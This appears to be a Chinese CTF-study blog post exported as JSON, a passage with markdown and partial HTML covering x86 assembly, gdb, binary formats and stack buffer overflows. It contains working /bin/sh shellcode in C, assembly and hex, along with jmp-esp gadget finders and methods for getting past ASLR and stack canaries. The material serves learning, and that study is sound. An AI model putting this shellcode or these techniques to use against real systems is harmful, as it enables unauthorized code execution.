语法用前缀表示数制（0x、0、0b）                 | Intel  语法用后缀表示数制（h、o、b）                         |\n| AT&T 语法要在常数前加 $、在寄存器名前加 % 符号       | Intel  语法没有相应的东西要加                                |\n\n**gdb**\n\n**gdb指令（短/长）**\n\n- r/run, c/continue\n- s/step, n/next\n- si, ni\n- b/break\n- bt/backtrace\n- x, print, display,     info\n- ...\n\n- Breakpoints: stops     when executed \n\n- - break function\n  - break *addr\n  - info break\n  - clear function\n  - delete/enable/disable      [n]\n\n- Watchpoints: stops     when values changed \n\n- - watch expr\n  - info watch\n\n- continue\n- step：     向前移动一步（语句），在调用函数时进入被调用者\n- stepi：    向前移动一步（指令），在调用函数时进入被调用者\n- next：     向前移动一步（语句），在调用函数时跳过被调用者\n- nexti：    向前移动一步（指令），在调用函数时跳过被调用者\n\n- print [/f] expr\n\n- 1. x      十六进制\n  2. d      有符号十进制\n  3. u      无符号十进制\n  4. o      八进制\n  5. t       二进制\n  6. a      地址\n  7. c      character\n  8. f       浮点数\n\n- info reg [rn]\n\n- Display \n\n- - x [/Nuf] expr \n\n  - - N count of units       to display\n\n    - u unit size \n\n    - - b 字节\n      - h 双字\n      - w 四字\n      - g 八字节\n\n    - f printing format       \n\n    - - s 空字符结束的字符串\n      - i 汇编指令\n\n  - disassem [addr]\n\n**链接过程**\n\n<img src=\"C:\\Users\\86153\\AppData\\Roaming\\Typora\\typora-user-images\\image-20210625161620552.png\" alt=\"image-20210625161620552\" style=\"zoom:20%;\" />\n\n**文件格式**\n\n- 文件类型识别 \n\n- - file命令\n  - 文件magic\n  - binwalk项目，参考ReFirmLabs/binwalk\n\n- 文件检查 \n\n- - md5sum，校验文件md5值\n  - virustotal,识别恶意代码\n  - fuzzy hashing: ssdeep fuzzywuzzy\n  - diff/patch\n\n- ELF/PE/Mach-O \n\n- - readelf命令\n  - peview/loard-pe/等\n\n**ELF文件格式**\n\n<img src=\"C:\\Users\\86153\\AppData\\Roaming\\Typora\\typora-user-images\\image-20210625161817046.png\" alt=\"image-20210625161817046\" style=\"zoom: 33%;\" />\n\n**PE文件格式**\n\n<img src=\"C:\\Users\\86153\\AppData\\Roaming\\Typora\\typora-user-images\\image-20210625161921562.png\" alt=\"image-20210625161921562\" style=\"zoom:33%;\" />\n\n**如何利用缓冲区溢出**\n\n- 覆盖局部变量 \n\n- - 尤其是函数指针\n\n- 覆盖错误句柄\n\n- 覆盖存储在栈帧上的指针\n\n- 覆盖返回地址 \n\n- - 当函数返回时改变EIP\n\n**shellcode开发**\n\n```c\nvoid main(){\n    char *name[2];\n    name[0] = \"/bin/sh\";\n    name[1] = NULL;\n    execve(name[0],name,NULL);\n}\n```\n\n**如何利用缓冲区溢出**\n\n把指令和数据改为字符串形式\n\n\"\\xeb\\x1f\\x5e\\x89\\x76\\x08\\x31\\xc0\\x88\\x46\\x46\n \\x0c\\xb0\\x0b\\x89\\xf3\\x8d\\x4e\\x08\\x8d\\x56\\x0c\\\n xcd\\x80\\x31\\xdb\\x89\\xd8\\x40\\xcd\\x80\\xe8\\xdc\\x\n ff\\xff\\xff/bin/sh\"\n\n**shellcode开发**\n\n编写汇编程序\n\n```assembly\nsection .text\nglobal _start\n_start:\nxor eax,eax\npush eax\npush 0x68732f2f\npush 0x6e69622f\nmov ebx,esp\npush eax\npush ebx\nmov ecx,esp\nxor edx,edx\nmov al,0xb\nint 0x80\n```\n\n编译并获取机器码\n\nchar shellcode[]=\"\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x50\\x53\\x89\\xe1\\x31\\xd2\\xb0\\x0b\\xcd\\x80\";\n\n- 不是所有的字符都能作为shellcode     \n\n- - gets():遇到换行符就停止\n  - strcpy():遇到NULL就停止\n  - ...\n\n- shellcode需要做相应的调整 \n\n- - 删除 \\x00,空格，换行符...\n  - 删除不能被打印的字符\n\n**基础栈溢出**\n\n- 覆盖返回地址，shellcode位与栈上     \n\n- - 问题：攻击者如何精确定位shellcode的地址\n  - 解决：NOP slide\n\n- 猜测大概的栈地址\n\n- 在shellcode前面填充大量NOPs\n\n<img src=\"C:\\Users\\86153\\AppData\\Roaming\\Typora\\typora-user-images\\image-20210625164034717.png\" alt=\"image-20210625164034717\" style=\"zoom:35%;\" />\n\n- 覆盖返回地址，shellcode位与栈上     \n\n- - 问题：如果buffer长度小于shellcode长度\n  - 解决：RNS模式\n\n- 把shellcode放在内存的高位上（调用者的栈帧）\n\n<img src=\"C:\\Users\\86153\\AppData\\Roaming\\Typora\\typora-user-images\\image-20210625164102489.png\" alt=\"image-20210625164102489\" style=\"zoom:33%;\" />\n\n**关于字符串的危险库函数**\n\n- strcpy (char *dest,     const char *src)\n- strcat (char *dest,     const char *src)\n- gets (char *s)\n- scanf ( const char     *format, ... )\n- ...\n\n**基础栈溢出的问题**\n\n- 依赖缓冲区/栈的地址，栈的地址会根据平台和每次运行而改变。\n- 如何构造一个适用于大多数平台的攻击？\n\n**jmp esp**\n\n- 寻找指令\"jmp     esp\"的地址\n- 不需要知道shellcode的地址\n\n<img src=\"C:\\Users\\86153\\AppData\\Roaming\\Typora\\typora-user-images\\image-20210625164339018.png\" alt=\"image-20210625164339018\" style=\"zoom:33%;\" />\n\n**到哪里寻找 \"jmp esp\"**\n\n```c\n#include <windows.h>\n#include <stdio.h>\nint main(int,char**,char**)\n{\n\tBYTE* pbyte;\n\tint nPos=0,nAddr=0;\n\tHINSTANCE hHinst=NULL;\n\tbool bTips=true;\n\thHinst=LoadLibrary(\"user32.dll\");\n\tif(!hHinst) return 0;\n\tpbyte=(BYTE*)hHinst;\n\twhile(bTips)\n\t{\n\t\tif(pbyte[nPos]==0xff && pbyte[nPos+1]==0xe4)\n\t\t{\n\t\t\tnAddr=(int)pbyte+nPos;\n\t\t\tprintf(\"address is 0x%x\\n\",nAddr);\n\t\t\tbTips=false;\n         }\n         else\n           nPos++;\n     }\n     if(hHinst!=NULL) FreeLibrary(hHinst);\n     return 1;\n}\n```\n\n```c++\n#include<windows.h>\n#include<iostream.h>\n#include<tchar.h>\nint main()\n{\nint nRetCode=0;\nbool we_load_it=false;\nHINSTANCE h;\nTCHAR dllname[]=_T(\"ntdll\");       \nh=GetModuleHandle(dllname);\nif(h==NULL)\n  {h=LoadLibrary(dllname);\nif(h==NULL)\n {cout<<\"ERROR LOADING DLL:\"<<dllname<<endl;\nreturn 1;\n}\nwe_load_it=true;\n}\nBYTE* ptr=(BYTE*)h;\nbool done=false;\nfor(int y=0;!done;y++)\n{try\n{\nif(ptr[y]==0xFF&&ptr[y+1]==0xE4)\n{int pos=(int)ptr+y;\ncout<<\"OPCODE found at 0x\"<<hex<<pos<<endl;}}\ncatch(...)\n{\ncout<<\"END OF\"<<dllname<<\"MEMORY REACHED\"<<endl;\ndone=true;\n}\n}\nif(we_load_it)\nFreeLibrary(h);\nreturn nRetCode;\n\n}\n```\n\n```c++\n#include<windows.h>\n#include<iostream.h>\n\n#include<tchar.h>\nint main()\n{\nint nRetCode=0;\nbool we_load_it=false;\nHINSTANCE h;\nTCHAR dllname[]=_T(\"ntdll\");       \nh=GetModuleHandle(dllname);\nif(h==NULL)\n  {h=LoadLibrary(dllname);\nif(h==NULL)\n {cout<<\"ERROR LOADING DLL:\"<<dllname<<endl;\nreturn 1;\n}\nwe_load_it=true;\n}\nBYTE* ptr=(BYTE*)h;\nbool done=false;\nfor(int y=0;!done;y++)\n{try\n{\nif(ptr[y]==0xFF&&ptr[y+1]==0xE4)\n{int pos=(int)ptr+y;\ncout<<\"OPCODE found at 0x\"<<hex<<pos<<endl;}}\ncatch(...)\n{\ncout<<\"END OF\"<<dllname<<\"MEMORY REACHED\"<<endl;\ndone=true;\n}\n}\nif(we_load_it)\nFreeLibrary(h);\nreturn nRetCode;\n}\n```\n\n不知道哪个能用>(●'◡'●)<\n\n**ASLR和PIE**\n\n地址址空间配置随机化（英语：Address space layout randomization，缩写ASLR，又称位址空间配置随机化、位址空间布局随机化）它是一种防范内存损坏漏洞被利用的计算机安全技术。位址空间配置随机载入利用随机方式配置资料定址空间，使某些敏感资料（例如作业系统内核）配置到一个恶意程式无法事先获知的位址，令攻击者难以进行攻击。\n\n- 程序每次执行的地址和libc的地址都会随机变化\n- 使用固定地址的\"jmp esp== '\\xff\\xe4' \"攻击失效\n\n**应对手段**\n\n**泄漏libc基地址**\n\n即使开启地址随机化，也不是全随机的。对于linux来说，开启ASLR，libc的基地址在每一次启动时都会变化，但是libc本身是整块存入内存的。即libc中指令相对于其基地址的偏移是不会变化的。而libc本身的指令是足够getshell的，所以要对抗ASLR，可以从泄露libc基地址下手。\n\n**stack cookies**\n\nCanary\n\n在缓冲区和返回地址之间插入一个cookie，函数返回时会检查其是否被修改，如果与插入时的值不一致，则认为发生了缓冲区溢出。\n\n<img src=\"C:\\Users\\86153\\AppData\\Roaming\\Typora\\typora-user-images\\image-20210625170722345.png\" alt=\"image-20210625170722345\" style=\"zoom:33%;\" />\n\n- 绕过手段 \n\n- - 通过信息泄漏漏洞获取cookie\n  - 使用不会覆盖cookie的漏洞\n  - 覆盖其他敏感数据而不是返回地址\n\n**影子栈-StackShield**\n\n- 把正确的返回地址保存在一个攻击者难以接触的地方\n- 函数返回时把当前返回地址和保存的返回地址比较\n\n在函数开始是保存RET，在函数返回时比较。\n\n- 优势 \n\n- - 返回地址难以覆盖\n\n- 劣势 \n\n- - 高性能开销\n  - 保存的返回地址需要被保护\n  - 兼容性问题\n\n","source":"_posts/ctfpwn1.md","raw":"```\n学习日记1\n```\n\n### 汇编基础（x86）\n\n- 内存\n\n- 寄存器： \n\n- 1. 普通: EAX, EBX, ECX, EDX\n                 ESI, EDI, EBP, ESP\n  2. 段寄存器:      CS, DS, ES, FS, GS, SS\n  3. 特殊寄存器:      EIP, EFLAGS\n\n- 指令: \n\n- 1. push,pop\n  2. add/sub/mul/div,      xor, or\n  3. mov,      lea,\n  4. test,      cmp, jmp, call, ret\n\n<img src=\"C:\\Users\\86153\\AppData\\Roaming\\Typora\\typora-user-images\\image-20210625155650349.png\" style=\"zoom:25%;\" />\n\n### 栈上的数据\n\nEIP存储的是下一条要执行的指令的地址，所以若EIP的值被修改为我们期望的地址，函数运行到ret时，程序将会跳到修改后的地址运行指令。根据上面来看，在进入函数时，通常栈上的数据是这样的。可以看出，ESP永远指向栈顶的位置，而EBP则永远指向当前函数空间的栈底。\n\n<img src=\"C:\\Users\\86153\\AppData\\Roaming\\Typora\\typora-user-images\\image-20210625155751637.png\" style=\"zoom:40%;\" />\n\n**IA32寄存器**\n\n<img src=\"C:\\Users\\86153\\AppData\\Roaming\\Typora\\typora-user-images\\image-20210625155828057.png\" style=\"zoom:25%;\" />\n\n**x86-64寄存器**\n\n<img src=\"C:\\Users\\86153\\AppData\\Roaming\\Typora\\typora-user-images\\image-20210625155850731.png\" style=\"zoom:25%;\" />\n\n**关键寄存器**\n\n- EIP： \n\n- - 指向下一条要被执行的指令，cpu将从eip指向的地址获取指令\n  - 不能被直接覆写\n\n- ESP： \n\n- - 指向栈顶\n  - PUSH/POP操作都基于操作ESP\n\n**基本指令**\n\n- 操作栈 \n\n- - push\n  - pop\n\n- 运算操作 \n\n- - add/sub/mul/div\n  - xor/or\n\n- 内存/寄存器操作 \n\n- - mov/lea\n\n- 条件执行 \n\n- - test，cmp，jmp\n  - jz，jnz，jg，ja\n\n- 子程序调用 \n\n- - call，ret\n\n**重要指令**\n\n- call     <function>:执行目标函数\n\n- - 把下一条指令（返回地址）压栈\n  - 跳转到目标函数\n  - 应该在函数调用完之后执行下一条指令\n\n- ret：返回调用\n\n- - 弹出（pop）栈顶，得到返回地址\n  - 跳转到跳转到返回地址（通过改变EIP）\n  - 应该跳转到调用方的下一条指令\n\n**函数调用时发生了什么**(x86)\n\n1. 传递参数\n2. call     函数地址（push eip，jmp 被调函数地址）\n3. ebp入栈，当前esp复制到ebp，esp减去一个数值，形成该函数的栈空间\n4. 初始化局部变量（自动变量）\n5. 运行函数指令\n6. 返回值传递\n7. pop ebp\n8. ret（pop     eip）\n\n这里没有提到平衡栈帧的操作，实际上根据调用约定的不同，这个操作会在调用者或被调用者两个地方进行。\n\n**Intel 和 AT&T语法**\n\n| **Intel Syntax** | **AT&T Syntax**   |\n| ---------------- | ----------------- |\n| mov  eax,1       | movl $1,  %eax    |\n| mov ebx,  0ffh   | movl  $0xff, %ebx |\n| int 80h          | int  $0x80        |\n\n```assembly\nsum: \n    push ebp\n    mov ebp, esp\n    mov eax, [ebp+12]\n    add eax, [ebp+8]\n    pop ebp\n    retn\nsum:\n    pushl %ebp\n    movl %esp,%ebp\n    movl 12(%ebp),%eax\n    addl 8(%ebp),%eax\n    popl %ebp\n    ret\n```\n\n| **Intel Syntax**                                     | **AT&T Syntax**                                              |\n| ---------------------------------------------------- | ------------------------------------------------------------ |\n| AT&T 语法先写源操作数，再写目标操作数                | Intel  语法先写目标操作数，再写源操作数：                    |\n| AT&T 语法将操作数的大小表示在指令的后缀中（b、w、l） | Intel  语法将操作数的大小表示在操作数的前缀中（BYTE PTR、WORD PTR、DWORD PTR） |\n| AT&T 语法总体上是offset(base, index, width)的格式    | Intel  语法总体上是[INDEX * WIDTH + BASE + OFFSET]的格式     |\n| AT&T 语法用前缀表示数制（0x、0、0b）                 | Intel  语法用后缀表示数制（h、o、b）                         |\n| AT&T 语法要在常数前加 $、在寄存器名前加 % 符号       | Intel  语法没有相应的东西要加                                |\n\n**gdb**\n\n**gdb指令（短/长）**\n\n- r/run, c/continue\n- s/step, n/next\n- si, ni\n- b/break\n- bt/backtrace\n- x, print, display,     info\n- ...\n\n- Breakpoints: stops     when executed \n\n- - break function\n  - break *addr\n  - info break\n  - clear function\n  - delete/enable/disable      [n]\n\n- Watchpoints: stops     when values changed \n\n- - watch expr\n  - info watch\n\n- continue\n- step：     向前移动一步（语句），在调用函数时进入被调用者\n- stepi：    向前移动一步（指令），在调用函数时进入被调用者\n- next：     向前移动一步（语句），在调用函数时跳过被调用者\n- nexti：    向前移动一步（指令），在调用函数时跳过被调用者\n\n- print [/f] expr\n\n- 1. x      十六进制\n  2. d      有符号十进制\n  3. u      无符号十进制\n  4. o      八进制\n  5. t       二进制\n  6. a      地址\n  7. c      character\n  8. f       浮点数\n\n- info reg [rn]\n\n- Display \n\n- - x [/Nuf] expr \n\n  - - N count of units       to display\n\n    - u unit size \n\n    - - b 字节\n      - h 双字\n      - w 四字\n      - g 八字节\n\n    - f printing format       \n\n    - - s 空字符结束的字符串\n      - i 汇编指令\n\n  - disassem [addr]\n\n**链接过程**\n\n<img src=\"C:\\Users\\86153\\AppData\\Roaming\\Typora\\typora-user-images\\image-20210625161620552.png\" alt=\"image-20210625161620552\" style=\"zoom:20%;\" />\n\n**文件格式**\n\n- 文件类型识别 \n\n- - file命令\n  - 文件magic\n  - binwalk项目，参考ReFirmLabs/binwalk\n\n- 文件检查 \n\n- - md5sum，校验文件md5值\n  - virustotal,识别恶意代码\n  - fuzzy hashing: ssdeep fuzzywuzzy\n  - diff/patch\n\n- ELF/PE/Mach-O \n\n- - readelf命令\n  - peview/loard-pe/等\n\n**ELF文件格式**\n\n<img src=\"C:\\Users\\86153\\AppData\\Roaming\\Typora\\typora-user-images\\image-20210625161817046.png\" alt=\"image-20210625161817046\" style=\"zoom: 33%;\" />\n\n**PE文件格式**\n\n<img src=\"C:\\Users\\86153\\AppData\\Roaming\\Typora\\typora-user-images\\image-20210625161921562.png\" alt=\"image-20210625161921562\" style=\"zoom:33%;\" />\n\n**如何利用缓冲区溢出**\n\n- 覆盖局部变量 \n\n- - 尤其是函数指针\n\n- 覆盖错误句柄\n\n- 覆盖存储在栈帧上的指针\n\n- 覆盖返回地址 \n\n- - 当函数返回时改变EIP\n\n**shellcode开发**\n\n```c\nvoid main(){\n    char *name[2];\n    name[0] = \"/bin/sh\";\n    name[1] = NULL;\n    execve(name[0],name,NULL);\n}\n```\n\n**如何利用缓冲区溢出**\n\n把指令和数据改为字符串形式\n\n\"\\xeb\\x1f\\x5e\\x89\\x76\\x08\\x31\\xc0\\x88\\x46\\x46\n \\x0c\\xb0\\x0b\\x89\\xf3\\x8d\\x4e\\x08\\x8d\\x56\\x0c\\\n xcd\\x80\\x31\\xdb\\x89\\xd8\\x40\\xcd\\x80\\xe8\\xdc\\x\n ff\\xff\\xff/bin/sh\"\n\n**shellcode开发**\n\n编写汇编程序\n\n```assembly\nsection .text\nglobal _start\n_start:\nxor eax,eax\npush eax\npush 0x68732f2f\npush 0x6e69622f\nmov ebx,esp\npush eax\npush ebx\nmov ecx,esp\nxor edx,edx\nmov al,0xb\nint 0x80\n```\n\n编译并获取机器码\n\nchar shellcode[]=\"\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x50\\x53\\x89\\xe1\\x31\\xd2\\xb0\\x0b\\xcd\\x80\";\n\n- 不是所有的字符都能作为shellcode     \n\n- - gets():遇到换行符就停止\n  - strcpy():遇到NULL就停止\n  - ...\n\n- shellcode需要做相应的调整 \n\n- - 删除 \\x00,空格，换行符...\n  - 删除不能被打印的字符\n\n**基础栈溢出**\n\n- 覆盖返回地址，shellcode位与栈上     \n\n- - 问题：攻击者如何精确定位shellcode的地址\n  - 解决：NOP slide\n\n- 猜测大概的栈地址\n\n- 在shellcode前面填充大量NOPs\n\n<img src=\"C:\\Users\\86153\\AppData\\Roaming\\Typora\\typora-user-images\\image-20210625164034717.png\" alt=\"image-20210625164034717\" style=\"zoom:35%;\" />\n\n- 覆盖返回地址，shellcode位与栈上     \n\n- - 问题：如果buffer长度小于shellcode长度\n  - 解决：RNS模式\n\n- 把shellcode放在内存的高位上（调用者的栈帧）\n\n<img src=\"C:\\Users\\86153\\AppData\\Roaming\\Typora\\typora-user-images\\image-20210625164102489.png\" alt=\"image-20210625164102489\" style=\"zoom:33%;\" />\n\n**关于字符串的危险库函数**\n\n- strcpy (char *dest,     const char *src)\n- strcat (char *dest,     const char *src)\n- gets (char *s)\n- scanf ( const char     *format, ... )\n- ...\n\n**基础栈溢出的问题**\n\n- 依赖缓冲区/栈的地址，栈的地址会根据平台和每次运行而改变。\n- 如何构造一个适用于大多数平台的攻击？\n\n**jmp esp**\n\n- 寻找指令\"jmp     esp\"的地址\n- 不需要知道shellcode的地址\n\n<img src=\"C:\\Users\\86153\\AppData\\Roaming\\Typora\\typora-user-images\\image-20210625164339018.png\" alt=\"image-20210625164339018\" style=\"zoom:33%;\" />\n\n**到哪里寻找 \"jmp esp\"**\n\n```c\n#include <windows.h>\n#include <stdio.h>\nint main(int,char**,char**)\n{\n\tBYTE* pbyte;\n\tint nPos=0,nAddr=0;\n\tHINSTANCE hHinst=NULL;\n\tbool bTips=true;\n\thHinst=LoadLibrary(\"user32.dll\");\n\tif(!hHinst) return 0;\n\tpbyte=(BYTE*)hHinst;\n\twhile(bTips)\n\t{\n\t\tif(pbyte[nPos]==0xff && pbyte[nPos+1]==0xe4)\n\t\t{\n\t\t\tnAddr=(int)pbyte+nPos;\n\t\t\tprintf(\"address is 0x%x\\n\",nAddr);\n\t\t\tbTips=false;\n         }\n         else\n           nPos++;\n     }\n     if(hHinst!=NULL) FreeLibrary(hHinst);\n     return 1;\n}\n```\n\n```c++\n#include<windows.h>\n#include<iostream.h>\n#include<tchar.h>\nint main()\n{\nint nRetCode=0;\nbool we_load_it=false;\nHINSTANCE h;\nTCHAR dllname[]=_T(\"ntdll\");       \nh=GetModuleHandle(dllname);\nif(h==NULL)\n  {h=LoadLibrary(dllname);\nif(h==NULL)\n {cout<<\"ERROR LOADING DLL:\"<<dllname<<endl;\nreturn 1;\n}\nwe_load_it=true;\n}\nBYTE* ptr=(BYTE*)h;\nbool done=false;\nfor(int y=0;!done;y++)\n{try\n{\nif(ptr[y]==0xFF&&ptr[y+1]==0xE4)\n{int pos=(int)ptr+y;\ncout<<\"OPCODE found at 0x\"<<hex<<pos<<endl;}}\ncatch(...)\n{\ncout<<\"END OF\"<<dllname<<\"MEMORY REACHED\"<<endl;\ndone=true;\n}\n}\nif(we_load_it)\nFreeLibrary(h);\nreturn nRetCode;\n\n}\n```\n\n```c++\n#include<windows.h>\n#include<iostream.h>\n\n#include<tchar.h>\nint main()\n{\nint nRetCode=0;\nbool we_load_it=false;\nHINSTANCE h;\nTCHAR dllname[]=_T(\"ntdll\");       \nh=GetModuleHandle(dllname);\nif(h==NULL)\n  {h=LoadLibrary(dllname);\nif(h==NULL)\n {cout<<\"ERROR LOADING DLL:\"<<dllname<<endl;\nreturn 1;\n}\nwe_load_it=true;\n}\nBYTE* ptr=(BYTE*)h;\nbool done=false;\nfor(int y=0;!done;y++)\n{try\n{\nif(ptr[y]==0xFF&&ptr[y+1]==0xE4)\n{int pos=(int)ptr+y;\ncout<<\"OPCODE found at 0x\"<<hex<<pos<<endl;}}\ncatch(...)\n{\ncout<<\"END OF\"<<dllname<<\"MEMORY REACHED\"<<endl;\ndone=true;\n}\n}\nif(we_load_it)\nFreeLibrary(h);\nreturn nRetCode;\n}\n```\n\n不知道哪个能用>(●'◡'●)<\n\n**ASLR和PIE**\n\n地址址空间配置随机化（英语：Address space layout randomization，缩写ASLR，又称位址空间配置随机化、位址空间布局随机化）它是一种防范内存损坏漏洞被利用的计算机安全技术。位址空间配置随机载入利用随机方式配置资料定址空间，使某些敏感资料（例如作业系统内核）配置到一个恶意程式无法事先获知的位址，令攻击者难以进行攻击。\n\n- 程序每次执行的地址和libc的地址都会随机变化\n- 使用固定地址的\"jmp esp== '\\xff\\xe4' \"攻击失效\n\n**应对手段**\n\n**泄漏libc基地址**\n\n即使开启地址随机化，也不是全随机的。对于linux来说，开启ASLR，libc的基地址在每一次启动时都会变化，但是libc本身是整块存入内存的。即libc中指令相对于其基地址的偏移是不会变化的。而libc本身的指令是足够getshell的，所以要对抗ASLR，可以从泄露libc基地址下手。\n\n**stack cookies**\n\nCanary\n\n在缓冲区和返回地址之间插入一个cookie，函数返回时会检查其是否被修改，如果与插入时的值不一致，则认为发生了缓冲区溢出。\n\n<img src=\"C:\\Users\\86153\\AppData\\Roaming\\Typora\\typora-user-images\\image-20210625170722345.png\" alt=\"image-20210625170722345\" style=\"zoom:33%;\" />\n\n- 绕过手段 \n\n- - 通过信息泄漏漏洞获取cookie\n  - 使用不会覆盖cookie的漏洞\n  - 覆盖其他敏感数据而不是返回地址\n\n**影子栈-StackShield**\n\n- 把正确的返回地址保存在一个攻击者难以接触的地方\n- 函数返回时把当前返回地址和保存的返回地址比较\n\n在函数开始是保存RET，在函数返回时比较。\n\n- 优势 \n\n- - 返回地址难以覆盖\n\n- 劣势 \n\n- - 高性能开销\n  - 保存的返回地址需要被保护\n  - 兼容性问题\n\n","slug":"ctfpwn1","published":1,"date":"2021-06-25T07:50:05.885Z","updated":"2021-06-25T09:09:35.850Z","title":"","comments":1,"layout":"post","photos":[],"link":"","_id":"cksan4n990002rouvbxzqfk4s","content":"<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">学习日记1</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"汇编基础（x86）\"><a href=\"#汇编基础（x86）\" class=\"headerlink\" title=\"汇编基础（x86）\"></a>汇编基础（x86）</h3><ul>\n<li><p>内存</p>\n</li>\n<li><p>寄存器： </p>\n</li>\n<li><ol>\n<li>普通: EAX, EBX, ECX, EDX<pre><code>        ESI, EDI, EBP, ESP\n</code></pre>\n</li>\n<li>段寄存器:      CS, DS, ES, FS, GS, SS</li>\n<li>特殊寄存器:      EIP, EFLAGS</li>\n</ol>\n</li>\n<li><p>指令: </p>\n</li>\n<li><ol>\n<li>push,pop</li>\n<li>add/sub/mul/div,      xor, or</li>\n<li>mov,      lea,</li>\n<li>test,      cmp, jmp, call, ret</li>\n</ol>\n</li>\n</ul>\n<img src=\"C:\\Users\\86153\\AppData\\Roaming\\Typora\\typora-user-images\\image-20210625155650349.png\" style=\"zoom:25%;\" />\n\n<h3 id=\"栈上的数据\"><a href=\"#栈上的数据\" class=\"headerlink\" title=\"栈上的数据\"></a>栈上的数据</h3><p>EIP存储的是下一条要执行的指令的地址，所以若EIP的值被修改为我们期望的地址，函数运行到ret时，程序将会跳到修改后的地址运行指令。根据上面来看，在进入函数时，通常栈上的数据是这样的。可以看出，ESP永远指向栈顶的位置，而EBP则永远指向当前函数空间的栈底。</p>\n<img src=\"C:\\Users\\86153\\AppData\\Roaming\\Typora\\typora-user-images\\image-20210625155751637.png\" style=\"zoom:40%;\" />\n\n<p><strong>IA32寄存器</strong></p>\n<img src=\"C:\\Users\\86153\\AppData\\Roaming\\Typora\\typora-user-images\\image-20210625155828057.png\" style=\"zoom:25%;\" />\n\n<p><strong>x86-64寄存器</strong></p>\n<img src=\"C:\\Users\\86153\\AppData\\Roaming\\Typora\\typora-user-images\\image-20210625155850731.png\" style=\"zoom:25%;\" />\n\n<p><strong>关键寄存器</strong></p>\n<ul>\n<li><p>EIP： </p>\n</li>\n<li><ul>\n<li>指向下一条要被执行的指令，cpu将从eip指向的地址获取指令</li>\n<li>不能被直接覆写</li>\n</ul>\n</li>\n<li><p>ESP： </p>\n</li>\n<li><ul>\n<li>指向栈顶</li>\n<li>PUSH/POP操作都基于操作ESP</li>\n</ul>\n</li>\n</ul>\n<p><strong>基本指令</strong></p>\n<ul>\n<li><p>操作栈 </p>\n</li>\n<li><ul>\n<li>push</li>\n<li>pop</li>\n</ul>\n</li>\n<li><p>运算操作 </p>\n</li>\n<li><ul>\n<li>add/sub/mul/div</li>\n<li>xor/or</li>\n</ul>\n</li>\n<li><p>内存/寄存器操作 </p>\n</li>\n<li><ul>\n<li>mov/lea</li>\n</ul>\n</li>\n<li><p>条件执行 </p>\n</li>\n<li><ul>\n<li>test，cmp，jmp</li>\n<li>jz，jnz，jg，ja</li>\n</ul>\n</li>\n<li><p>子程序调用 </p>\n</li>\n<li><ul>\n<li>call，ret</li>\n</ul>\n</li>\n</ul>\n<p><strong>重要指令</strong></p>\n<ul>\n<li><p>call     <function>:执行目标函数</p>\n</li>\n<li><ul>\n<li>把下一条指令（返回地址）压栈</li>\n<li>跳转到目标函数</li>\n<li>应该在函数调用完之后执行下一条指令</li>\n</ul>\n</li>\n<li><p>ret：返回调用</p>\n</li>\n<li><ul>\n<li>弹出（pop）栈顶，得到返回地址</li>\n<li>跳转到跳转到返回地址（通过改变EIP）</li>\n<li>应该跳转到调用方的下一条指令</li>\n</ul>\n</li>\n</ul>\n<p><strong>函数调用时发生了什么</strong>(x86)</p>\n<ol>\n<li>传递参数</li>\n<li>call     函数地址（push eip，jmp 被调函数地址）</li>\n<li>ebp入栈，当前esp复制到ebp，esp减去一个数值，形成该函数的栈空间</li>\n<li>初始化局部变量（自动变量）</li>\n<li>运行函数指令</li>\n<li>返回值传递</li>\n<li>pop ebp</li>\n<li>ret（pop     eip）</li>\n</ol>\n<p>这里没有提到平衡栈帧的操作，实际上根据调用约定的不同，这个操作会在调用者或被调用者两个地方进行。</p>\n<p><strong>Intel 和 AT&amp;T语法</strong></p>\n<table>\n<thead>\n<tr>\n<th><strong>Intel Syntax</strong></th>\n<th><strong>AT&amp;T Syntax</strong></th>\n</tr>\n</thead>\n<tbody><tr>\n<td>mov  eax,1</td>\n<td>movl $1,  %eax</td>\n</tr>\n<tr>\n<td>mov ebx,  0ffh</td>\n<td>movl  $0xff, %ebx</td>\n</tr>\n<tr>\n<td>int 80h</td>\n<td>int  $0x80</td>\n</tr>\n</tbody></table>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sum: </span><br><span class=\"line\">    push ebp</span><br><span class=\"line\">    mov ebp, esp</span><br><span class=\"line\">    mov eax, [ebp+12]</span><br><span class=\"line\">    add eax, [ebp+8]</span><br><span class=\"line\">    pop ebp</span><br><span class=\"line\">    retn</span><br><span class=\"line\">sum:</span><br><span class=\"line\">    pushl %ebp</span><br><span class=\"line\">    movl %esp,%ebp</span><br><span class=\"line\">    movl 12(%ebp),%eax</span><br><span class=\"line\">    addl 8(%ebp),%eax</span><br><span class=\"line\">    popl %ebp</span><br><span class=\"line\">    ret</span><br></pre></td></tr></table></figure>\n\n<table>\n<thead>\n<tr>\n<th><strong>Intel Syntax</strong></th>\n<th><strong>AT&amp;T Syntax</strong></th>\n</tr>\n</thead>\n<tbody><tr>\n<td>AT&amp;T 语法先写源操作数，再写目标操作数</td>\n<td>Intel  语法先写目标操作数，再写源操作数：</td>\n</tr>\n<tr>\n<td>AT&amp;T 语法将操作数的大小表示在指令的后缀中（b、w、l）</td>\n<td>Intel  语法将操作数的大小表示在操作数的前缀中（BYTE PTR、WORD PTR、DWORD PTR）</td>\n</tr>\n<tr>\n<td>AT&amp;T 语法总体上是offset(base, index, width)的格式</td>\n<td>Intel  语法总体上是[INDEX * WIDTH + BASE + OFFSET]的格式</td>\n</tr>\n<tr>\n<td>AT&amp;T 语法用前缀表示数制（0x、0、0b）</td>\n<td>Intel  语法用后缀表示数制（h、o、b）</td>\n</tr>\n<tr>\n<td>AT&amp;T 语法要在常数前加 $、在寄存器名前加 % 符号</td>\n<td>Intel  